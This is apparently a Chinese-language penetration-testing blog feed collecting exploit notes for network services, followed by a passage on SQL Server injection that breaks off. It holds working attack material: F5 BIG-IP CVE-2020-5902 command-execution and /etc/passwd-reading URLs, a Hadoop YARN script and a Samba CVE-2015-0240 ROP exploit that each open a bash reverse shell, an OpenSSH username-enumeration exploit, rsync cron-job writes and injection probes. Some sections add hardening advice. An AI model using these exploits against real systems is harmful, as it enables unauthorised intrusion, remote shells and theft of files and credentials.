id="F5_BIG-IP">F5 BIG-IP 远程代码执行漏洞poc exp（CVE-2020-5902）</span></h2><p><strong>POC</strong></p><pre><code>RCE: curl -v -k  &#39;https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin&#39;Read File: curl -v -k  &#39;https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd&#39;写文件：/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/123.txt&amp;content=testtesttest读文件：/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/tmp/123.txt</code></pre><p><strong>BurpSuite Request</strong></p><pre><code>GET /tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/usr/local/www/ HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:52.0) Gecko/20100101 Firefox/52.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: JSESSIONID=65ACC6C79B31335D71E4F432DB39EA50Connection: closeUpgrade-Insecure-Requests: 1</code></pre><pre><code>BurpSuite RequestsGET /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:52.0) Gecko/20100101 Firefox/52.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1</code></pre><p><strong>EXP</strong></p><pre><code>1. tmshCmd.jsp?command=create+cli+alias+private+list+command+bash2. fileSave.jsp?fileName=/tmp/cmd&amp;content=id3. tmshCmd.jsp?command=list+/tmp/cmd4. tmshCmd.jsp?command=delete+cli+alias+private+list</code></pre><hr><h2 id="Hadoop-YARN-ResourceManager-未授权访问"><a href="#Hadoop-YARN-ResourceManager-未授权访问" class="headerlink" title="Hadoop YARN ResourceManager 未授权访问"></a>Hadoop YARN ResourceManager 未授权访问</h2><ol><li>Hadoop是一个由Apache基金会所开发的分布式系统基础架构，端口：8088</li><li>利用：</li><li>在本地监听等待反弹 shell 连接</li><li>调用 New Application API 创建 Application</li><li>调用 Submit Application API 提交</li><li>nc -lvp 9999</li></ol><pre><code>import requeststarget = &#39;http://server_IP:8088/&#39;lhost = &#39;attacker_ip&#39;  # put your local host ip here, and listen at port 9999url = target + &#39;ws/v1/cluster/apps/new-application&#39;resp = requests.post(url)print(resp.text)app_id = resp.json()[&#39;application-id&#39;]url = target + &#39;ws/v1/cluster/apps&#39;data = {    &#39;application-id&#39;: app_id,    &#39;application-name&#39;: &#39;get-shell&#39;,    &#39;am-container-spec&#39;: {        &#39;commands&#39;: {            &#39;command&#39;: &#39;/bin/bash -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1&#39; % lhost,        },    },    &#39;application-type&#39;: &#39;YARN&#39;,}print (data)requests.post(url, json=data)</code></pre><hr><h2 id="LDAP-未授权访问"><a href="#LDAP-未授权访问" class="headerlink" title="LDAP 未授权访问"></a>LDAP 未授权访问</h2><ol><li>ldap://IP:389</li></ol><hr><h2 id="Memcache-未授权漏洞"><a href="#Memcache-未授权漏洞" class="headerlink" title="Memcache 未授权漏洞"></a>Memcache 未授权漏洞</h2><ol><li>memcache是一套分布式的高速缓存系统，它以Key-Value（键值对）形式将数据存储在内存中，默认开放11211端口，使用nmap的脚本进行扫描。</li><li>nmap 192.168.70.129 -p11211 –script=”memcached-info.nse”</li><li>nc -nvv IP 11211</li><li></li></ol><hr><h2 id="MongoDB-未授权访问"><a href="#MongoDB-未授权访问" class="headerlink" title="MongoDB 未授权访问"></a>MongoDB 未授权访问</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><ol><li>MongoDB服务安装后，默认监听27017端口，默认未开启权限验证。如果服务监听在0.0.0.0，则可远程无需授权访问数据库。</li><li>3.0之前版本的MongoDB,默认监听在0.0.0.0，3.0及之后版本默认监听在127.0.0.1。</li><li>3.0之前版本，如未添加用户管理员账号及数据库账号，使用–auth参数启动时，在本地通过127.0.0.1仍可无需账号密码登陆访问数据库，远程访问则提示需登录认证；</li><li>3.0及之后版本，使用–auth参数启动后，无账号则本地和远程均无任何数据库访问权限。</li></ol><h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><ol><li>开启MongoDB服务时不添加任何参数时,默认是没有权限验证的,登录的用户可以通过默认端口无需密码对数据库任意操作（增、删、改、查高危动作）而且可以远程访问数据库。</li></ol><h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p><strong>MSF auxiliary/scanner/mongodb/mongodb_login模块验证</strong></p><ol><li>use auxiliary/scanner/mongodb/mongodb_login</li><li>set rhosts IP</li><li>exploit</li></ol><p><strong>工具直连数据库</strong></p><ol><li>mongo.exe 127.0.0.1 #未授权漏洞存在时，这样就可以直接连接数据库</li><li>show dbs #默认存在local库</li></ol><p><strong>常用命令</strong></p><ol><li>show dbs</li><li>use [dbname]</li><li>show users</li></ol><h3 id="漏洞修复或加固"><a href="#漏洞修复或加固" class="headerlink" title="漏洞修复或加固"></a>漏洞修复或加固</h3><ol><li>建议使用或更换到当前最新版本的mongodb。</li><li>修改默认端口（27017）为其他端口。</li><li>禁止mongodb服务对外开放或部署在DMZ区。</li><li>修改mongodb配置，指定允许访问的IP（–bind_ip选项）。</li><li>启用基于角色的登录认证功能，用户为非常见用户，密码符合复杂度要求。</li><li>若开启HTTP服务和REST接口，请禁用（nohttpinterface = false）。</li><li>开启日志审计功能。</li><li>使用SSL加密功能。</li><li>对数据进行加密存储。</li><li>对数据进行多地备份。</li></ol><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><ol><li><a href="https://docs.mongodb.com/manual/reference/program/mongo/" target="_blank" rel="noopener">https://docs.mongodb.com/manual/reference/program/mongo/</a></li><li>Navicat </li></ol><hr><h2 id="NFS-未授权访问"><a href="#NFS-未授权访问" class="headerlink" title="NFS 未授权访问"></a>NFS 未授权访问</h2><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><ol><li>NFS（Network File System）即网络文件系统，默认监听端口2049，它允许网络中的计算机之间通过TCP/IP网络共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。若运维人员未对文件访问进行控制，将导致本地文件可被任意读取。</li></ol><h3 id="漏洞危害-1"><a href="#漏洞危害-1" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><ol><li>本地文件可被任意读取或写入文件。</li></ol><h3 id="漏洞验证-1"><a href="#漏洞验证-1" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><ol><li>showmount -e IP #查看开启2049端口服务的IP服务器允许哪些IP开放</li><li>mount -t nfs IP:/[dir] /tmp/ #将IP上开放的目录挂载到本地/tmp/目录下</li><li>umount /tmp/ #卸载本地的共享目录</li></ol><p><strong>使用MFS模块</strong></p><ol><li>auxiliary/scanner/nfs/nfsmount</li></ol><h3 id="漏洞修复或加固-1"><a href="#漏洞修复或加固-1" class="headerlink" title="漏洞修复或加固"></a>漏洞修复或加固</h3><ol><li>修改默认端口（111,2049）为其他端口</li><li>指定IP范围允许访问NFS服务</li><li>使用 anonuid，anongid 配置共享目录，让挂载到 NFS 服务器的客户机仅具有最小权限。</li><li>配置 nosuid 和 noexec，使用 nosuid 选项禁止 set-UID 程序在 NFS 服务器上运行，使用 noexec 禁止直接执行其中的二进制文件。</li></ol><h2 id="NFS服务全攻略"><a href="#NFS服务全攻略" class="headerlink" title="NFS服务全攻略"></a><a href="https://www.cnblogs.com/lgf01010/articles/9610411.html" target="_blank" rel="noopener">NFS服务全攻略</a></h2><h2 id="office宏攻击"><a href="#office宏攻击" class="headerlink" title="office宏攻击"></a>office宏攻击</h2><ol><li><a href="https://github.com/Ridter/CVE-2017-11882/" target="_blank" rel="noopener">https://github.com/Ridter/CVE-2017-11882/</a></li><li><a href="https://www.cnblogs.com/Oran9e/p/7880832.html" target="_blank" rel="noopener">https://www.cnblogs.com/Oran9e/p/7880832.html</a></li><li>影响版本：</li><li>office 2003</li><li>office 2007</li><li>office 2010</li><li>office 2013</li><li>office 2016</li></ol><hr><h2 id="OpenSSH-用户名枚举漏洞（CVE-2018-15473）"><a href="#OpenSSH-用户名枚举漏洞（CVE-2018-15473）" class="headerlink" title="OpenSSH 用户名枚举漏洞（CVE-2018-15473）"></a>OpenSSH 用户名枚举漏洞（CVE-2018-15473）</h2><ol><li>端口：22、2222、20022等等</li><li>OpenSSH 7.7前存在一个用户名枚举漏洞，通过该漏洞，攻击者可以判断某个用户名是否存在于目标主机中。</li><li><a href="https://github.com/Rhynorater/CVE-2018-15473-Exploit" target="_blank" rel="noopener">https://github.com/Rhynorater/CVE-2018-15473-Exploit</a></li><li>python3 sshUsernameEnumExploit.py –port 22 –userList exampleInput.txt your-ip</li></ol><pre><code>import argparseimport loggingimport paramikoimport multiprocessingimport socketimport stringimport sysimport jsonfrom random import randint as randfrom random import choice as choice# store function we will overwrite to malform the packetold_parse_service_accept = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT]# list to store 3 random usernames (all ascii_lowercase characters); this extra step is added to check the target# with these 3 random usernames (there is an almost 0 possibility that they can be real ones)random_username_list = []# populate the listfor i in range(3):    user = &quot;&quot;.join(choice(string.ascii_lowercase) for x in range(rand(15, 20)))    random_username_list.append(user)# create custom exceptionclass BadUsername(Exception):    def __init__(self):        pass# create malicious &quot;add_boolean&quot; function to malform packetdef add_boolean(*args, **kwargs):    pass# create function to call when username was invaliddef call_error(*args, **kwargs):    raise BadUsername()# create the malicious function to overwrite MSG_SERVICE_ACCEPT handlerdef malform_packet(*args, **kwargs):    old_add_boolean = paramiko.message.Message.add_boolean    paramiko.message.Message.add_boolean = add_boolean    result  = old_parse_service_accept(*args, **kwargs)    #return old add_boolean function so start_client will work again    paramiko.message.Message.add_boolean = old_add_boolean    return result# create function to perform authentication with malformed packet and desired usernamedef checkUsername(username, tried=0):    sock = socket.socket()    sock.connect((args.hostname, args.port))    # instantiate transport    transport = paramiko.transport.Transport(sock)    try:        transport.start_client()    except paramiko.ssh_exception.SSHException:        # server was likely flooded, retry up to 3 times        transport.close()        if tried &lt; 4:            tried += 1            return checkUsername(username, tried)        else:            print(&#39;[-] Failed to negotiate SSH transport&#39;)    try:        transport.auth_publickey(username, paramiko.RSAKey.generate(1024))    except BadUsername:            return (username, False)    except paramiko.ssh_exception.AuthenticationException:            return (username, True)    #Successful auth(?)    raise Exception(&quot;There was an error. Is this the correct version of OpenSSH?&quot;)# function to test target system using the randomly generated usernamesdef checkVulnerable():    vulnerable = True    for user in random_username_list:        result = checkUsername(user)        if result[1]:            vulnerable = False    return vulnerabledef exportJSON(results):    data = {&quot;Valid&quot;:[], &quot;Invalid&quot;:[]}    for result in results:        if result[1] and result[0] not in data[&#39;Valid&#39;]:            data[&#39;Valid&#39;].append(result[0])        elif not result[1] and result[0] not in data[&#39;Invalid&#39;]:            data[&#39;Invalid&#39;].append(result[0])    return json.dumps(data)def exportCSV(results):    final = &quot;Username, Valid\n&quot;    for result in results:        final += result[0]+&quot;, &quot;+str(result[1])+&quot;\n&quot;    return finaldef exportList(results):    final = &quot;&quot;    for result in results:        if result[1]:            final+=result[0]+&quot; is a valid user!\n&quot;        else:            final+=result[0]+&quot; is not a valid user!\n&quot;    return final# assign functions to respective handlersparamiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packetparamiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error# get rid of paramiko logginglogging.getLogger(&#39;paramiko.transport&#39;).addHandler(logging.NullHandler())arg_parser = argparse.ArgumentParser()arg_parser.add_argument(&#39;hostname&#39;, type=str, help=&quot;The target hostname or ip address&quot;)arg_parser.add_argument(&#39;--port&#39;, type=int, default=22, help=&quot;The target port&quot;)arg_parser.add_argument(&#39;--threads&#39;, type=int, default=5, help=&quot;The number of threads to be used&quot;)arg_parser.add_argument(&#39;--outputFile&#39;, type=str, help=&quot;The output file location&quot;)arg_parser.add_argument(&#39;--outputFormat&#39;, choices=[&#39;list&#39;, &#39;json&#39;, &#39;csv&#39;], default=&#39;list&#39;, type=str, help=&quot;The output file location&quot;)group = arg_parser.add_mutually_exclusive_group(required=True)group.add_argument(&#39;--username&#39;, type=str, help=&quot;The single username to validate&quot;)group.add_argument(&#39;--userList&#39;, type=str, help=&quot;The list of usernames (one per line) to enumerate through&quot;)args = arg_parser.parse_args()def main():    sock = socket.socket()    try:        sock.connect((args.hostname, args.port))        sock.close()    except socket.error:        print(&#39;[-] Connecting to host failed. Please check the specified host and port.&#39;)        sys.exit(1)    # first we run the function to check if host is vulnerable to this CVE    if not checkVulnerable():        # most probably the target host is either patched or running a version not affected by this CVE        print(&quot;Target host most probably is not vulnerable or already patched, exiting...&quot;)        sys.exit(0)    elif args.username: #single username passed in        result = checkUsername(args.username)        if result[1]:            print(result[0]+&quot; is a valid user!&quot;)        else:            print(result[0]+&quot; is not a valid user!&quot;)    elif args.userList: #username list passed in        try:            f = open(args.userList)        except IOError:            print(&quot;[-] File doesn&#39;t exist or is unreadable.&quot;)            sys.exit(3)        usernames = map(str.strip, f.readlines())        f.close()        # map usernames to their respective threads        pool = multiprocessing.Pool(args.threads)        results = pool.map(checkUsername, usernames)        try:            if args.outputFile:                outputFile = open(args.outputFile, &quot;w&quot;)        except IOError:            print(&quot;[-] Cannot write to outputFile.&quot;)            sys.exit(5)        if args.outputFormat==&#39;json&#39;:            if args.outputFile:                outputFile.writelines(exportJSON(results))                outputFile.close()                print(&quot;[+] Results successfully written to &quot; + args.outputFile + &quot; in JSON form.&quot;)            else:                print(exportJSON(results))        elif args.outputFormat==&#39;csv&#39;:            if args.outputFile:                outputFile.writelines(exportCSV(results))                outputFile.close()                print(&quot;[+] Results successfully written to &quot; + args.outputFile + &quot; in CSV form.&quot;)            else:                print(exportCSV(results))        else:            if args.outputFile:                outputFile.writelines(exportList(results))                outputFile.close()                print(&quot;[+] Results successfully written to &quot; + args.outputFile + &quot; in List form.&quot;)            else:                print(exportList(results))    else: # no usernames passed in        print(&quot;[-] No usernames provided to check&quot;)        sys.exit(4)if __name__ == &#39;__main__&#39;:    main()</code></pre><hr><h2 id="rsync-未授权访问漏洞"><a href="#rsync-未授权访问漏洞" class="headerlink" title="rsync 未授权访问漏洞"></a>rsync 未授权访问漏洞</h2><ol><li>端口：873</li><li>rsync rsync://your-ip:873/ </li><li>rsync rsync://your-ip:873/dir/ #假如存在dir目录</li><li>rsync -av rsync://your-ip:873/dir/etc/passwd ./ #假如/dir/是Linux根目录，这里就是下载/etc/passwd</li><li>rsync -av shell rsync://your-ip:873/dir/etc/cron.d/shell #写入计划任务</li></ol><pre><code># -*- coding:utf-8 -*-&quot;&quot;&quot;Rsync匿名访问漏洞（未授权访问漏洞）验证工具&quot;&quot;&quot;#引入依赖的包和库文件import osimport sysimport socketimport logging#全局配置设置logging.basicConfig(level=logging.INFO,format=&quot;%(message)s&quot;)socket.setdefaulttimeout(3)#全局变量client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)#全局函数：def str2Binary(content):    &quot;&quot;&quot;将文本流转换成二进制流&quot;&quot;&quot;    return content.replace(&#39; &#39;,&#39;&#39;).replace(&#39;\n&#39;,&#39;&#39;).decode(&#39;hex&#39;)def rsyncCheck(ip,port):    &quot;&quot;&quot;执行端口预检查&quot;&quot;&quot;    global client    try:        client.connect((ip,port))    except Exception,reason:        logging.error(&quot;[-] 访问失败：%s&quot;%reason)        return False    helloString = &quot;405253594e43443a2033312e300a&quot;    try:        client.send(str2Binary(helloString))        hellodata = client.recv(1024)    except Exception,reason:        logging.error(&quot;[-] 通信失败：%s&quot;%reason)        return False    if hellodata.find(&quot;@RSYNCD&quot;) &gt;= 0:        try:            client.send(str2Binary(&quot;0a&quot;))        except Exception,reason:            logging.error(&quot;[-] 访问失败：%s&quot;%reason)            return False        while True:            try:                data = client.recv(1024)            except Exception,reason:                logging.error(&quot;[-] 通信失败：%s&quot;%reason)            if data == &quot;&quot;:                break            else:                if str(data).find(&quot;@RSYNCD: EXIT&quot;) &gt;= 0:                    logging.info(&quot;[*] 发现漏洞！&quot;)                    return True    return Falseif __name__ == &quot;__main__&quot;:    ip = sys.argv[1]    try:        port = sys.argv[2]    except Exception,reason:        port = 873        logging.error(&quot;[-] 端口未输入，按照873默认端口进行&quot;)    try:        port = int(port)    except Exception,reason:        logging.error(&quot;[-] 端口输入错误，按照873默认端口进行&quot;)        port = 873    if not rsyncCheck(ip,port):        logging.info(&quot;[+] 测试安全！&quot;)</code></pre><hr><h2 id="Samba-CVE-2015-0240-远程代码执行漏洞"><a href="#Samba-CVE-2015-0240-远程代码执行漏洞" class="headerlink" title="Samba CVE-2015-0240 远程代码执行漏洞"></a>Samba CVE-2015-0240 远程代码执行漏洞</h2><ol><li>端口：445</li><li>Samba 3.5.x 全版本</li><li>Samba 3.6.x 到 Samba 3.6.25 之前的版本</li><li>Samba 4.0.x 到 Samba 4.0.25 之前的版本</li><li>Samba 4.1.x 到 Samba 4.1.17 之前的版本</li><li>Samba 4.2.x 到 Samba 4.2.0rc5 之前的版本</li></ol><pre><code>#!/usr/bin/env python2# Author: kelwin@chaitin.com# sudo apt-get install samba=2:3.6.3-2ubuntu2 samba-common=2:3.6.3-2ubuntu2 libwbclient0=2:3.6.3-2ubuntu2import sysimport signalimport time# https://github.com/zTrix/ziofrom zio import *from multiprocessing import Pool, Managerimport impacketfrom impacket.dcerpc.v5 import transport, nrpcfrom impacket.dcerpc.v5.ndr import NDRCALLfrom impacket.dcerpc.v5.dtypes import *host = &#39;127.0.0.1&#39;port = 445cmd = &quot;bash -c &#39;bash &gt;/dev/tcp/127.0.0.1/1337 0&lt;&amp;1 &#39;\0&quot;# 0x0041e2cb: pop eax ; pop esi ; pop edi ; pop ebp ; ret ;pop4ret_o = 0x41e2cb# 0x000a6d7c: lea esp, dword [ecx-0x04] ; ret ;popebx_o = 0x006fd522pivot_o = 0xa6d7cgot_o = 0x9cd640fmt_o = 0x8e043esystem_o = 0xa4250 snprintf_o = 0xa3e20bss_o = 0x9d5dc0pie = 0x80000000free_addr = 0x809fa10c + 8 + 32def exploit(free_addr, pie=0, destructor=-1, step=0x80):    pivot = pie + pivot_o    pop4ret = pie + pop4ret_o    popebx = pie + popebx_o    got = pie + got_o    fmt = pie + fmt_o    system = pie + system_o    snprintf = pie + snprintf_o    bss = pie + bss_o    if pie != 0:        destructor = pivot    # struct talloc_chunk {    #     struct talloc_chunk *next, *prev;    #     struct talloc_chunk *parent, *child;    #     struct talloc_reference_handle *refs; // refs = 0    #     talloc_destructor_t destructor; // destructor = -1: (No Crash), others: controled EIP    #     const char *name;    #     size_t size;    #     unsigned flags; // magic    #     void *poo    # };    talloc_chunk = l32(0)           # refs =&gt; 0    talloc_chunk += l32(destructor) # destructor =&gt; control EIP    talloc_chunk += l32(pop4ret)    # pop4ret    talloc_chunk += &#39;leet&#39;          #    talloc_chunk += l32(0xe8150c70) # flags =&gt; magic    # ebx =&gt; got    rop = l32(popebx) + l32(got)    # write cmd to bss    for i in xrange(len(cmd)):        c = cmd[i]        rop += l32(snprintf) + l32(pop4ret)        rop += l32(bss + i) + l32(2) + l32(fmt) + l32(ord(c))    # system(cmd)    rop += l32(system) + &#39;leet&#39; + l32(bss)    payload = &#39;deadbeef&#39;    payload += talloc_chunk * 0x1000 * step    payload += &#39;leet&#39; * 2    payload += rop.ljust(2560, &#39;C&#39;)    payload += &#39;cafebabe&#39; + &#39;\0&#39;    username = &#39;&#39;    password = &#39;&#39;    ###    # impacket does not implement NetrServerPasswordSet    ###    # 3.5.4.4.6 NetrServerPasswordSet (Opnum 6)    class NetrServerPasswordSet(NDRCALL):        opnum = 6        structure = (           (&#39;PrimaryName&#39;,nrpc.PLOGONSRV_HANDLE),           (&#39;AccountName&#39;,WSTR),           (&#39;SecureChannelType&#39;,nrpc.NETLOGON_SECURE_CHANNEL_TYPE),           (&#39;ComputerName&#39;,WSTR),           (&#39;Authenticator&#39;,nrpc.NETLOGON_AUTHENTICATOR),           (&#39;UasNewPassword&#39;,nrpc.ENCRYPTED_NT_OWF_PASSWORD),        )    class NetrServerPasswordSetResponse(NDRCALL):        structure = (           (&#39;ReturnAuthenticator&#39;,nrpc.NETLOGON_AUTHENTICATOR),           (&#39;ErrorCode&#39;,NTSTATUS),        )    nrpc.OPNUMS[6] = (NetrServerPasswordSet, NetrServerPasswordSetResponse)    ###    # connect to target    ###    rpctransport = transport.DCERPCTransportFactory(r&#39;ncacn_np:%s[\PIPE\netlogon]&#39; % host)    rpctransport.set_credentials(&#39;&#39;,&#39;&#39;)  # NULL session    rpctransport.set_dport(port)    # impacket has a problem with SMB2 dialect against samba4    # force to &#39;NT LM 0.12&#39; only    rpctransport.preferred_dialect(&#39;NT LM 0.12&#39;)    dce = rpctransport.get_dce_rpc()    dce.connect()    dce.bind(nrpc.MSRPC_UUID_NRPC)    sessionKey = &#39;\x00&#39; * 16    ###    # prepare ServerPasswordSet request    ###    authenticator = nrpc.NETLOGON_AUTHENTICATOR()    authenticator[&#39;Credential&#39;] = nrpc.ComputeNetlogonCredential(&#39;12345678&#39;, sessionKey)    authenticator[&#39;Timestamp&#39;] = 10    uasNewPass = nrpc.ENCRYPTED_NT_OWF_PASSWORD()    uasNewPass[&#39;Data&#39;] = payload    primaryName = nrpc.PLOGONSRV_HANDLE()    # ReferentID field of PrimaryName controls the uninitialized value of creds in ubuntu 12.04 32bit    primaryName.fields[&#39;ReferentID&#39;] = free_addr    request = NetrServerPasswordSet()    request[&#39;PrimaryName&#39;] = primaryName    request[&#39;AccountName&#39;] = username + &#39;\x00&#39;    request[&#39;SecureChannelType&#39;] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.WorkstationSecureChannel    request[&#39;ComputerName&#39;] = host + &#39;\x00&#39;    request[&#39;Authenticator&#39;] = authenticator    request[&#39;UasNewPassword&#39;] = uasNewPass    DCERPCSessionError = nrpc.DCERPCSessionError    try:        resp = dce.request(request)        print(&quot;no error !!! error code: 0xc0000225 or 0xc0000034 is expected&quot;)        print(&quot;seems not vulnerable&quot;)        # resp.dump()        dce.disconnect()        return 2    except DCERPCSessionError as e:        # expect error_code: 0xc0000225 - STATUS_NOT_FOUND        # expect error_code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND        print(&quot;seems not vulnerable&quot;)        # resp.dump()        dce.disconnect()        return 2    except impacket.nmb.NetBIOSError as e:        # print &#39;exception occured&#39;        if e.args[0] == &#39;Error while reading from remote&#39;:            # print(&quot;connection lost!!!\nmight be vulnerable&quot;)            return 1        else:            raise    except AttributeError:        # print(&quot;exception&quot;)        return 0def init_worker():    signal.signal(signal.SIGINT, signal.SIG_IGN)def guess_heap(free_addr, step, hits):    if len(hits) &gt; 0: return    log(&quot;[+] trying heap addr %s&quot; % hex(free_addr), &#39;green&#39;)    res = exploit(free_addr, destructor=-1, step=step)    if res == 0:        res = exploit(free_addr, destructor=0, step=step)        if res != 0:            log(&quot;hit: %s&quot; % hex(free_addr), &#39;red&#39;)            hits.append(free_addr)def guess_pie(free_addr, pie, step):    log(&quot;[+] trying pie base addr %s&quot; % hex(pie), &#39;green&#39;)    try:        exploit(free_addr, pie=pie, step=step)    except impacket.nmb.NetBIOSTimeout:        passdef brute_force_heap(step):    hit = False    print &quot;Initializng 10 processes for brute forcing heap address...&quot;    pool = Pool(10, init_worker)    manager = Manager()    hits = manager.list()    for free_addr_base in range(0xb7700000, 0xba000000, 0x1000 * step * 20):        for offset in xrange(5):            pool.apply_async(guess_heap, (free_addr_base + offset * 4, step, hits))    try:        while True:            time.sleep(5)            if len(hits) &gt; 0:                pool.terminate()                pool.join()                return hits[0]    except KeyboardInterrupt:        print &quot;Caught KeyboardInterrupt, terminating...&quot;        pool.terminate()        pool.join()        sys.exit(0)def brute_force_pie(free_addr, step):    print &quot;Initializng 10 processes for brute forcing PIE base address...&quot;    pool = Pool(10, init_worker)    for pie in range(0xb6d00000, 0xb6f00000, 0x1000):        pool.apply_async(guess_pie, (free_addr, pie, step))    try:        time.sleep(60 * 60)    except KeyboardInterrupt:        print &quot;Caught KeyboardInterrupt, terminating...&quot;        pool.terminate()        pool.join()    else:        pool.close()        pool.join()step = 0x1free_addr = brute_force_heap(step)brute_force_pie(free_addr, step)</code></pre><hr><h2 id="Samba-远程命令执行漏洞（CVE-2017-7494）"><a href="#Samba-远程命令执行漏洞（CVE-2017-7494）" class="headerlink" title="Samba 远程命令执行漏洞（CVE-2017-7494）"></a>Samba 远程命令执行漏洞（CVE-2017-7494）</h2><ol><li>端口：445</li><li>Samba版本：4.6.3（该漏洞在4.6.4被修复）</li><li>Samba允许连接一个远程的命名管道，并且在连接前会调用is_known_pipename()函数验证管道名称是否合法。在is_known_pipename()函数中，并没有检查管道名称中的特殊字符，加载了使用该名称的动态链接库。导致攻击者可以构造一个恶意的动态链接库文件，执行任意代码。</li><li>该漏洞要求的利用条件：</li><li><ul><li>拥有共享文件写入权限，如：匿名可写等</li></ul></li><li><ul><li>需要知道共享目录的物理路径</li></ul></li><li>Linux安装smbclient：apt install smbclient</li><li>smbclient //IP/myshare -N #连接</li><li>exploit/linux/samba/is_known_pipename #MSF下的利用模块</li></ol><hr><h2 id="ZooKeeper-未授权访问"><a href="#ZooKeeper-未授权访问" class="headerlink" title="ZooKeeper 未授权访问"></a>ZooKeeper 未授权访问</h2><h3 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><ol><li>ZooKeeper是一个分布式的，开放源码的分布式应用程序协调服务，是Google的Chubby一个开源的实现，是Hadoop和Hbase的重要组件。它是一个为分布式应用提供一致性服务的软件，提供的功能包括：配置维护、域名服务、分布式同步、组服务等。ZooKeeper的目标就是封装好复杂易出错的关键服务，将简单易用的接口和性能高效、功能稳定的系统提供给用户。<br>在通常情况下，zookeeper允许未经授权的访问。</li></ol><h3 id="漏洞危害-2"><a href="#漏洞危害-2" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><ol><li>ZooKeeper默认开启在2181端口，在未进行任何访问控制情况下，攻击者可通过未授权漏洞访问zookeeper数据库，可以执行数据库增删改查等危险操作，执行envi命令可获得系统大量的敏感信息，包括系统名称、Java环境。</li></ol><h3 id="漏洞验证-2"><a href="#漏洞验证-2" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><ol><li>zkcli.sh -server [IP]:[port] #连接数据库</li><li>getacl / #查看当前权限</li><li>echo stat | nc IP 2181</li><li>echo envi | nc IP 2181</li></ol><h3 id="漏洞修复或加固-2"><a href="#漏洞修复或加固-2" class="headerlink" title="漏洞修复或加固"></a>漏洞修复或加固</h3><ol><li>修改默认端口为其他端口，2181：对cline端提供服务，2888：集群内机器通讯使用（Leader监听此端口），3888：选举leader使用</li><li>配置防火墙策略，不对外网开放，指定允许访问zookeeper服务的IP</li><li>添加用户认证并设置相应的权限</li></ol><hr>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> 端口 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SqlServer</title>
      <link href="/SqlServer/"/>
      <url>/SqlServer/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-SqlServer"><a href="#0x00-SqlServer" class="headerlink" title="0x00 SqlServer"></a>0x00 SqlServer</h2><ol><li>SQL Server 是Microsoft 公司推出的关系型数据库管理系统。</li><li>默认端口：1433（server数据库服务）、1434（monitor数据库监控）、2433（ms-sql-hidden）</li></ol><h2 id="0x01-常见弱口令"><a href="#0x01-常见弱口令" class="headerlink" title="0x01 常见弱口令"></a>0x01 常见弱口令</h2><ol><li>用户名/密码：SA/空</li></ol><h2 id="0x02-常用工具"><a href="#0x02-常用工具" class="headerlink" title="0x02 常用工具"></a>0x02 常用工具</h2><ol><li>sqlserver分析器</li><li>SQLtools</li></ol><h2 id="0x10-mssql注入常用函数"><a href="#0x10-mssql注入常用函数" class="headerlink" title="0x10 mssql注入常用函数"></a>0x10 mssql注入常用函数</h2><ol><li>DB_NAME() #当前库名，master</li><li>user #当前用户，dbo</li><li>user_name() #用户名，dbo</li><li>suser_name() #当前登录用户名</li><li>@@database #</li><li>@@version #数据库版本</li><li>sysobjects #正常则为sqlserver数据库</li><li>msysobjects #正常则为access数据库</li><li>select DATABASEPROPERTYEX(‘master’,’version’) #查询SQLServer对应的内部数据库版本号</li></ol><h2 id="0x11-常用语句"><a href="#0x11-常用语句" class="headerlink" title="0x11 常用语句"></a>0x11 常用语句</h2><ol><li>and exsits(select * from sysobjects)&gt;0 #正常则为sqlserver数据库</li><li>and exsits(select * from msysobjects)&gt;0 #正常则为access数据库</li><li>and exists(select * from amdin) #判断是否存在admin表，其他的admin_user、admin_login、user、users、username、manager、useradmin等等</li><li>and exists(select admin from admin_user) #判断是否存在admin列，其他列：id、pwd、user、users、passwd、password等等</li><li>order by 10 #判断字段长度 </li><li>select IS_SRVROLEMEMBER(‘sysadmin’); #判断是否SA权限</li><li>select * from sysdatabases; #查询所有数据库</li><li>-xtype=’U’ 